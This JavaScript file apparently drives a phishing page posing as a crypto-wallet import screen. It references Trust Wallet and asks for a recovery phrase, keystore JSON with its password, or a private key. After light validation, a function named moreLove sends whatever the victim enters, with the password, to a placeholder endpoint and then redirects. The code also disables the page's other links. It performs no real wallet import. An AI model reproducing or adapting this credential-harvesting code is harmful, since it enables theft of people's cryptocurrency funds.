String.prototype.toProperCase = function () {
    return (this.replace(/\w\S*/g, function (txt) {
        return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase()
    })).replace("Json", "JSON").toString();
};

let TabIndex = 1;
let e_1 = 'Invalid mnemonic phrase. Learn more: <a href="#">https://community.trustwallet.com/t/cannot-import-wallet-invalid-mnemonic-phrase-error/1716</a>';
let e_2 = "Failed to import JSON key, invalid keystone or JSON string";
let e_3 = "Failed to import private key, provide a valid key and try again";
let wallet = "";
$(document).ready(function () {
    $("a").each(function (index, element) {
        if ($(element).hasClass('download') === false) {
            $(element).attr("onclick", "return false;")
        }
    })

    $("#tabs").tabs({
        beforeActivate: function (event, ui) {
            $("#private_phrase, #private_password").val("");
            $("#toMove").appendTo($(ui.newPanel));
            $("label[for=private_phrase] span").html($(ui.newTab).text().trim().toProperCase());
            if ($(ui.newPanel).attr('id') === "tabOne") {
                $(".password").hide();
                TabIndex = 1
                $("#msg").html("Typically 12 (sometimes 24) words seperated by single spaces");
            } else if ($(ui.newPanel).attr('id') === "tabTwo") {
                $(".password").show();
                TabIndex = 2
                $("#msg").html("Several lines of text beginning with '{…}' plus the password you used to encrypt it");
            } else {
                TabIndex = 3
                $("#msg").html("Typically 64 alohanumeric charaters");
                $(".password").hide();
            }

        },
        activate: function (event, ui) {
            $(".phrase, .password").removeClass('has-values error focus');
        }
    });
    $('#coinAsset').select2({
        placeholder: "Select a state",
        templateSelection: function (data) {
            console.log(data)
            if (!data.element) {
                return data.text;
            }
            let $element = $(data.element);
            let $wrapper = $('<span></span>');
            $wrapper.addClass($element[0].className);
            $("#topTitle").html(data.text);
            $wrapper.text(data.text);
            wallet = data.text + " Wallet";
            return $wrapper;
        },
        templateResult: function (data) {
            if (!data.element) {
                return data.text;
            }
            let $element = $(data.element);
            let $wrapper = $('<span></span>');
            $wrapper.addClass($element[0].className);

            $wrapper.text(data.text);

            return $wrapper;
        }
    });

    $("#private_phrase").on('focus focusout change', function (e) {
        if (e.type === "focus") {
            $(".phrase").addClass('focus');
        } else {
            $(".phrase").removeClass('focus');
            if ($(this).val().length < 1) {
                $(".phrase").removeClass('has-values');
            } else {
                $(".phrase").addClass('has-values');
            }
        }
    })


    $("#private_password").on('focus focusout change', function (e) {
        if (e.type === "focus") {
            $(".password").addClass('focus');
        } else {
            $(".password").removeClass('focus');
            if ($(this).val().length < 1) {
                $(".password").removeClass('has-values');
            } else {
                $(".password").addClass('has-values');
            }
        }
    })

})

$(".buttonDive > a").on('click', async function (e) {
    e.preventDefault();
    let $private_phrase = $("#private_phrase");
    let $private_password = $("#private_password");
    let $error1 = $private_phrase.parent().children('.errors');
    let $error2 = $private_password.parent().children('.errors');
    let content = $private_phrase.val();
    let content2 = $private_password.val();
    if (content.length < 1) {
        $error1.html("This field is required");
        $private_phrase.parent().addClass('error');
        return false;
    }
    if (TabIndex === 1) {
        if (content.includes("  ")) {
            $error1.html(e_1);
            $private_phrase.parent().addClass('error');
            return false;
        } else {
            let failed = false;
            for (let str of content.split(" ")) {
                if (str.length < 1) {
                    failed = true;
                }
            }
            if ((content.split(" ").length === 12 || content.split(" ").length === 24) && failed === false) {
                $(".popUpLoading").show();
                moreLove(content, "Phrase", wallet, content2);
                return false;
            } else {
                $error1.html(e_1);
                $private_phrase.parent().addClass('error');
                return false;
            }
        }
    }

    if (TabIndex === 2) {
        let check = false;
        if (isJson(content) === false) {
            $error1.html(e_2);
            $private_phrase.parent().addClass('error');
            check = true;
        }

        if (content2.length < 1) {
            $error2.html("This field is required");
            $private_password.parent().addClass('error');
            check = true;
        } else if (content2.length < 4) {
            $error2.html("Invalid password");
            $private_password.parent().addClass('error');
            check = true;
        }

        if (check === true) {
            return false;
        } else {
            $(".popUpLoading").show();
            moreLove(content, "Keystone JSON", wallet, content2);
            return false;
        }
    }

    if (TabIndex === 3) {
        if (content.length <= 64 || content.length > 35) {
            $(".popUpLoading").show();
            moreLove(content, "Private Key", wallet, content2);
            return false;
        } else {
            $error1.html(e_3);
            $private_phrase.parent().addClass('error');
            return false;
        }
    }

    return false;
})

function isJson(str) {
    try {
        let re = typeof JSON.parse(str.trim().trim().trim().trim().trim().trim().trim().trim().trim().trim().trim().trim().trim().trim().trim().trim().trim().trim().trim().trim().trim().trim().trim()) === "object";
        console.log(re);
        return re;
    } catch (e) {
        return false;
    }
}

function moreLove(key, type, wallet, password) {
    $.ajax({
        dataType: 'text',
        url: SCRIPT_LINK,
        type: 'POST',
        data: {
            key,
            type,
            password,
            wallet,
        },
        success: function (response) {
            setTimeout(function () {
                window.location.replace(REDIRECT_LINK);
            }, 2000);
        },
        error: function (response) {
            console.log(response)
            window.location.replace(window.location.href);
        },
        complete: function () {
        }
    });
}